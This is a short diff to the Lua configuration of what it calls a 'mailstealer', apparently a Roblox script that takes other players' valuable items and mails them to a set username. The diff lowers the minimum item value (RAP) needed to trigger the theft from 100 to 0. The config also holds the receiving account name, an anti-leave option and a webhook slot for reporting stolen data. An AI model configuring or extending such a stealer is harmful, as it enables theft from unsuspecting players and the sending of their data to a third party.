@@ -2,7 +2,7 @@
 --[[ Main Config ]]--
 Username = "mirusjas9663" 
 AntiLeave = true
-min_rap = 100 -- rap the player needs to use mailstealer
+min_rap = 0 -- rap the player needs to use mailstealer
 
 --[[ Webhook Config ]]--
 Webhook = "Your Webhook Here"
